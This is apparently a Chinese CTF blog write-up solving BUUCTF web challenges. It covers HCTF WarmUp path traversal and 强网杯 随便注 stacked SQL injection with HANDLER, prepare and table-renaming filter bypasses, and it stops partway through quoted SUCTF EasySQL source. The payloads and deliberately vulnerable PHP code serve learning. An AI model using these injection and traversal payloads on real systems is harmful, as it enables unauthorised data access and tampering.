@@ -1,0 +1,2552 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="buuctf-web-wp, 信安小白 web安全 CTF southerose">
+    <meta name="description" content="信安小白 | web安全 | CTF">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>buuctf-web-wp | southerose&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="southerose's Blog" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">southerose&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">southerose&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            信安小白 | web安全 | CTF
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/southerose/" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/southerose/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20211116173634.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">buuctf-web-wp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/buuctf/">
+                                <span class="chip bg-color">buuctf</span>
+                            </a>
+                        
+                            <a href="/tags/wp/">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/ctf/" class="post-category">
+                                ctf
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-07-10
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-11-16
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    31 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>文件包含类题目</li>
+<li>首先要去想，如何才能执行下面的include语句，要满足if语句中的3个条件，第三个条件主要就是分析出<code>mb_substr</code>函数截取之后</li>
+</ul>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620154402.png"></p>
+<p>滑稽~，直接查看源代码</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620154427.png"></p>
+<p>提示source.php</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    highlight_file(__FILE__);
+    class emmm
+    {
+        public static function checkFile(&amp;$page)
+        {
+            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];
+            if (! isset($page) || !is_string($page)) {
+                echo "you can't see it";
+                return false;
+            }
+
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo "you can't see it";
+            return false;
+        }
+    }
+
+    if (! empty($_REQUEST['file'])
+        &amp;&amp; is_string($_REQUEST['file'])
+        &amp;&amp; emmm::checkFile($_REQUEST['file'])
+    ) {
+        include $_REQUEST['file'];
+        exit;
+    } else {
+        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";
+    }  
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>根据code找到页面中有个hint.php</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620154647.png"></p>
+<p>首先，我们传入一个get型的参数file，在if语句中判断并满足三个条件都为<code>True</code>时，然后才会去<code>包含</code>传入的参数</p>
+<ul>
+<li>传参不为空</li>
+<li>传参是字符串</li>
+<li>传参要经过emmm类中的checkfile函数</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">if (! empty($_REQUEST['file'])
+        &amp;&amp; is_string($_REQUEST['file'])
+        &amp;&amp; emmm::checkFile($_REQUEST['file'])
+    ) {
+        include $_REQUEST['file'];
+        exit;
+    } else {
+        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";
+    }  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们继续来分析下，checkfile函数，首先有一个whitelist，接着我们传进来的参数要经过三个if语句</p>
+<ul>
+<li><p>第一个if，不能让他返回<code>false</code>，所以需要传入的参数需要设置并且是字符串</p>
+</li>
+<li><p>第二个if，如果返回True的话，只能去包含指定的文件：source.php和hint.php，而我们是要想办法去包含刚刚hint.php中提示我们的ffffllllaaaagggg文件</p>
+</li>
+<li><p>第三个if，<code>mb_substr</code>函数实际上是substr截取字符的中文版，可以截取中文字符，可以从它设置的参数中发现，它从（0）起始位置截取<code>$page</code>，截取的长度通过函数<code>mb_strpos（返回第二个参数字符在第一个参数中第一次出现的位置）</code>来返回，整个这段意思就是截取?之前的字符串，比如<code>hint.php?file=/etc/passwd</code>，$_page的值会变成hint.php</p>
+</li>
+</ul>
+<p>接着再进行白名单校验，返回True，然后就直接在最后去包含文件了</p>
+<p>payload</p>
+<pre class="line-numbers language-none"><code class="language-none">index.php?file=hint.php?../../../../ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行之后，执行到checkfile函数中的三个if时，会变成<code>hint.php</code>，显然hint.php满足白名单校验，所以返回True，三个if语句这时候都为真，就直接执行include语句，就能看到flag</p>
+<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>PHP万能密码登陆</li>
+</ul>
+<h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620203052.png"></p>
+<p>打开时一个登录框，直接上万能密码</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620203416.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620203547.png"></p>
+<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>get型传参</li>
+</ul>
+<h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620204027.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">$cat=$_GET['cat'];
+echo $cat;
+if($cat=='dog'){
+   echo 'Syc{cat_cat_cat_cat}';
+ }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>直接传入一个参数<code>cat</code></p>
+<pre class="line-numbers language-none"><code class="language-none">?cat=dog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620204201.png"></p>
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>（这题本身没有源码，源码是我从网上下载的便于学习）</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;easy_sql&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;
+&lt;!-- sqlmap是没有灵魂的 --&gt;
+&lt;form method="get"&gt;
+    姿势: &lt;input type="text" name="inject" value="1"&gt;
+    &lt;input type="submit"&gt;
+&lt;/form&gt;
+
+&lt;pre&gt;
+&lt;?php
+function waf1($inject) {
+    preg_match("/select|update|delete|drop|insert|where|\./i",$inject) &amp;&amp; die('return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);');
+}
+function waf2($inject) {
+    strstr($inject, "set") &amp;&amp; strstr($inject, "prepare") &amp;&amp; die('strstr($inject, "set") &amp;&amp; strstr($inject, "prepare")');
+}
+if(isset($_GET['inject'])) {
+    $id = $_GET['inject'];
+    waf1($id);
+    waf2($id);
+    $mysqli = new mysqli("127.0.0.1","root","root","supersqli");
+    //多条sql语句
+    $sql = "select * from `words` where id = '$id';";
+    $res = $mysqli-&gt;multi_query($sql);
+    if ($res){//使用multi_query()执行一条或多条sql语句
+      do{
+        if ($rs = $mysqli-&gt;store_result()){//store_result()方法获取第一条sql语句查询结果
+          while ($row = $rs-&gt;fetch_row()){
+            var_dump($row);
+            echo "&lt;br&gt;";
+          }
+          $rs-&gt;Close(); //关闭结果集
+          if ($mysqli-&gt;more_results()){  //判断是否还有更多结果集
+            echo "&lt;hr&gt;";
+          }
+        }
+      }while($mysqli-&gt;next_result()); //next_result()方法获取下一结果集，返回bool值
+    } else {
+      echo "error ".$mysqli-&gt;errno." : ".$mysqli-&gt;error;
+    }
+    $mysqli-&gt;close();  //关闭数据库连接
+}
+?&gt;
+&lt;/pre&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li><code>堆叠注入</code></li>
+<li><code>show</code>也是可以查字段的</li>
+<li>关注<code>multi_query()</code>，可能造成堆叠注入</li>
+<li><code>handler</code>绕过select被限制</li>
+<li><code>预编译</code>绕过select被限制</li>
+<li><code>更改表名列名</code>绕过select被限制</li>
+</ul>
+<h2 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h2><blockquote>
+<p>是否存在注入</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">1' or 1=2#
+1' or 1=1#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621164415.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621164444.png"></p>
+<p>到这里发现存在注入，首先尝试<code>union select</code>联合查询注入</p>
+<blockquote>
+<p>联合查询注入（无法利用）</p>
+</blockquote>
+<p>查询列数</p>
+<pre class="line-numbers language-none"><code class="language-none">1' order by 2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621164648.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621164735.png"></p>
+<p>这里过滤了很多字符，<code>select update delete drop insert where ./</code>，双写和大小写<code>select</code>无法绕过，这里我们经过一番探索，发现堆叠注入</p>
+<blockquote>
+<p>堆叠注入</p>
+</blockquote>
+<p>查库</p>
+<pre class="line-numbers language-none"><code class="language-none">1';show database;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620211947.png"></p>
+<p>查表</p>
+<pre class="line-numbers language-none"><code class="language-none">1';show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620210241.png"></p>
+<p>查询到当前存在一张名为<code>1919810931114514</code>，很特异，所以猜测flag存在在该表中</p>
+<blockquote>
+<p>查列</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">1';show columns from `1919810931114514`;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621165416.png"></p>
+<p>这里还可使用<code>desc</code>，查看到列名</p>
+<pre class="line-numbers language-none"><code class="language-none">1';desc `1919810931114514`;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620212200.png"></p>
+<p><strong>要绕过<code>select</code>查询flag，有以下几种方式：</strong></p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><blockquote>
+<p>handler代替select</p>
+</blockquote>
+<p>网上搜索一番，mysql中有个<code>handler</code>语句可以代替select部分功能</p>
+<p>handler语法如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">HANDLER tbl_name OPEN [ [AS] alias]
+
+HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ { FIRST | NEXT }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>构造payload</p>
+<pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open;handler `1919810931114514` read next;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote>
+<p>预编译</p>
+</blockquote>
+<p>预编译相关语法如下：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">set用于设置变量名和值
+prepare用于预备一个语句，并赋予名称，以后可以引用该语句
+execute执行语句
+deallocate prepare用来释放掉预处理的语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#
+
+拆分开来如下
+1';
+set @sql = CONCAT('se','lect * from `1919810931114514`;');
+prepare stmt from @sql;
+EXECUTE stmt;
+#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>strstr这个函数并不能区分大小写，我们将payload其大写即可</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#
+
+拆分开来如下：
+1';
+Set @sql = CONCAT('se','lect * from `1919810931114514`;');
+Prepare stmt from @sql;
+EXECUTE stmt;
+#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><blockquote>
+<p>更改表名列名</p>
+</blockquote>
+<p>修改表名和列名的语法如下：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">修改表名(将表名user改为users)
+alter table user rename to users;
+
+修改列名(将字段名username改为name)
+alter table users change uesrname name varchar(30);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload</p>
+<pre class="line-numbers language-none"><code class="language-none">1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
+
+拆分开来如下
+1';
+alter table words rename to words1;
+alter table `1919810931114514` rename to words;
+alter table words change flag id varchar(50);
+#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这时候再去查询</p>
+<pre class="line-numbers language-none"><code class="language-none">1' or 1=1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>就能查询到<code>1919810931114514</code>改名成<code>words</code>的内容了</p>
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>网上找的源码</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    session_start();
+
+    include_once "config.php";
+
+    $post = array();
+    $get = array();
+    global $MysqlLink;
+
+    //GetPara();
+    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);
+    if(!$MysqlLink){
+        die("Mysql Connect Error!");
+    }
+    $selectDB = mysqli_select_db($MysqlLink,$dataName);
+    if(!$selectDB){
+        die("Choose Database Error!");
+    }
+
+    foreach ($_POST as $k=&gt;$v){
+        if(!empty($v)&amp;&amp;is_string($v)){
+            $post[$k] = trim(addslashes($v));
+        }
+    }
+    foreach ($_GET as $k=&gt;$v){
+        }
+    }
+    //die();
+?&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;
+&lt;form action="" method="post"&gt;
+&lt;input type="text" name="query"&gt;
+&lt;input type="submit"&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php
+
+    if(isset($post['query'])){
+        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\"";
+        //var_dump(preg_match("/{$BlackList}/is",$post['query']));
+        if(preg_match("/{$BlackList}/is",$post['query'])){
+            //echo $post['query'];
+            die("Nonono.");
+        }
+        if(strlen($post['query'])&gt;40){
+            die("Too long.");
+        }
+        $sql = "select ".$post['query']."||flag from Flag";
+        mysqli_multi_query($MysqlLink,$sql);
+        do{
+            if($res = mysqli_store_result($MysqlLink)){
+                while($row = mysqli_fetch_row($res)){
+                    print_r($row);
+                }
+            }
+        }while(@mysqli_next_result($MysqlLink));
+
+    }
+
